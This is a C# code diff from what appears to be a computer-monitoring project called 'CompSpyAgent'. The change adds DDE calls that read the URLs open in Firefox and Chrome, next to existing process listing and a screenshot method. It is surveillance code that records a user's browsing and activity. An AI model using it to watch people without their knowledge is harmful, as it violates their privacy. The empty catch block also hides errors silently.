@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using System.Drawing;
 using System.Windows.Forms;
 using System.Diagnostics;
+using NDde.Client;
 
 namespace CompSpyAgent
 {
@@ -36,20 +37,35 @@ namespace CompSpyAgent
             listaProcesow = Process.GetProcesses();
 
             //aktualizacja otwartych stron
+            listaStron.Clear();
+            listaZPrzegladarki("Firefox");
+            //listaZPrzegladarki("firefox");
+            listaZPrzegladarki("Chrome");
 
-            foreach(var p in listaProcesow)
+
+
+
+
+        } 
+        public void listaZPrzegladarki(string przegladarka)
+        {
+            try
             {
-                if (Convert.ToString(p.ProcessName) == "chrome")
+                DdeClient dde = new DdeClient(przegladarka, "WWW_GetWindowInfo");
+                dde.Connect();
+                string url = dde.Request("URL", int.MaxValue);
+                string[] urls = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
+                dde.Disconnect();
+                foreach(var u in urls)
                 {
-                    listaStron.Add("[chrome] " + p.MainWindowTitle);
+                    listaStron.Add(u);
                 }
             }
+            catch
+            {
 
-
-
-
-
-        }   
+            }
+        }
 
         public void getZrzut(PictureBox p)
         {
